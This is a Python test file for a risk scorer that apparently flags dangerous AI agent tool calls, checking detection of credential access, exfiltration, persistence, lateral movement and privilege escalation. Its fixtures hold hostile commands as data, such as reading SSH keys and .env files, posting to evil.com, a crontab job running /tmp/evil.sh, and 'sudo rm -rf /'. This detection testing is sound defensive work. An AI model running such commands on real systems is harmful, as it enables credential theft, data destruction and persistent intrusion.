"""Phase 2 tests for analyzer/scorer.py — new patterns and score_session."""
from __future__ import annotations

import pytest

from agentwit.analyzer.scorer import RiskScorer, RISK_PATTERNS


# ---------------------------------------------------------------------------
# New pattern tests
# ---------------------------------------------------------------------------

class TestNewRiskPatterns:
    def setup_method(self):
        self.scorer = RiskScorer()

    def _event(self, tool: str = "", payload: dict | None = None) -> dict:
        return {"tool": tool, "full_payload": payload or {}, "risk_indicators": []}

    # credential_access_extended
    def test_credential_dotenv(self):
        e = self._event(payload={"cmd": "cat /app/.env"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert any("credential" in p for p in patterns)

    def test_credential_pem_file(self):
        e = self._event(payload={"file": "server.pem"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert any("credential" in p for p in patterns)

    def test_credential_id_rsa(self):
        e = self._event(tool="read_file", payload={"path": "/root/.ssh/id_rsa"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert any("credential" in p for p in patterns)

    # data_exfiltration
    def test_data_exfil_external_upload(self):
        e = self._event(payload={"url": "https://evil.com/upload", "data": "sensitive"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert any("exfil" in p or "data_exfil" in p for p in patterns)

    def test_data_exfil_post_external(self):
        e = self._event(tool="http_post", payload={"url": "https://attacker.io/post"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert any("exfil" in p or "data_exfil" in p for p in patterns)

    # persistence
    def test_persistence_crontab(self):
        e = self._event(payload={"cmd": "crontab -e && echo '* * * * * /tmp/evil.sh'"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "persistence" in patterns

    def test_persistence_systemctl_enable(self):
        e = self._event(payload={"cmd": "systemctl enable myservice"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "persistence" in patterns

    # lateral_movement
    def test_lateral_movement_nmap(self):
        e = self._event(payload={"cmd": "nmap -sV 192.168.1.0/24"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "lateral_movement" in patterns

    def test_lateral_movement_arp(self):
        e = self._event(payload={"cmd": "arp -a"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "lateral_movement" in patterns

    # privilege_escalation
    def test_priv_esc_sudo(self):
        e = self._event(payload={"cmd": "sudo -s"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "privilege_escalation" in patterns

    def test_priv_esc_suid(self):
        e = self._event(payload={"cmd": "chmod 4755 /usr/local/bin/myapp"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "privilege_escalation" in patterns

    def test_priv_esc_visudo(self):
        e = self._event(payload={"cmd": "visudo"})
        inds = self.scorer.score_event(e)
        patterns = [i["pattern"] for i in inds]
        assert "privilege_escalation" in patterns

    def test_critical_severity(self):
        e = self._event(payload={"cmd": "sudo rm -rf /"})
        inds = self.scorer.score_event(e)
        sevs = [i["severity"] for i in inds]
        assert "critical" in sevs

    def test_benign_event_unchanged(self):
        e = self._event(tool="read_file", payload={"path": "/home/user/notes.txt"})
        inds = self.scorer.score_event(e)
        # Should still have file_write? No — read_file doesn't match write/create/edit
        file_write = [i for i in inds if i["pattern"] == "file_write"]
        assert file_write == []


# ---------------------------------------------------------------------------
# score_session tests
# ---------------------------------------------------------------------------

class TestScoreSession:
    def setup_method(self):
        self.scorer = RiskScorer()

    def _event(self, tool: str = "", payload: dict | None = None, risk_indicators: list | None = None) -> dict:
        return {
            "tool": tool,
            "full_payload": payload or {},
            "risk_indicators": risk_indicators or [],
        }

    def test_empty_session(self):
        result = self.scorer.score_session([])
        assert result["total_events"] == 0
        assert result["risk_level"] == "LOW"
        assert result["indicators_total"] == 0

    def test_low_risk_session(self):
        events = [self._event(tool="read_file", payload={"path": "/tmp/a.txt"})]
        result = self.scorer.score_session(events)
        assert result["total_events"] == 1
        # read_file alone does not match high patterns
        assert result["risk_level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL")

    def test_critical_session_from_sudo(self):
        events = [self._event(payload={"cmd": "sudo bash"})]
        result = self.scorer.score_session(events)
        assert result["risk_level"] == "CRITICAL"
        assert result["counts"]["critical"] >= 1

    def test_high_risk_session(self):
        events = [self._event(tool="bash", payload={"cmd": "ls -la"})]
        result = self.scorer.score_session(events)
        # bash matches shell_exec → HIGH
        assert result["risk_level"] in ("HIGH", "CRITICAL")
        assert result["counts"]["high"] + result["counts"]["critical"] >= 1

    def test_consecutive_high_risk_detected(self):
        events = [
            self._event(payload={"cmd": "bash -i"}),
            self._event(payload={"cmd": "nmap -sV 10.0.0.0/8"}),
            self._event(payload={"cmd": "sudo -s"}),
        ]
        result = self.scorer.score_session(events)
        assert len(result["consecutive_high_risk"]) >= 1
        assert result["risk_level"] in ("HIGH", "CRITICAL")

    def test_pattern_frequency_counted(self):
        events = [
            self._event(tool="bash", payload={"cmd": "ls"}),
            self._event(tool="run_command", payload={"cmd": "ps aux"}),
        ]
        result = self.scorer.score_session(events)
        assert "shell_exec" in result["pattern_frequency"]
        assert result["pattern_frequency"]["shell_exec"] >= 2

    def test_high_risk_events_list(self):
        events = [
            self._event(tool="read_file"),        # low / no match
            self._event(payload={"cmd": "bash"}), # HIGH
        ]
        result = self.scorer.score_session(events)
        high = result["high_risk_events"]
        assert isinstance(high, list)
        assert len(high) >= 1
        idx, evt = high[0]
        assert isinstance(idx, int)
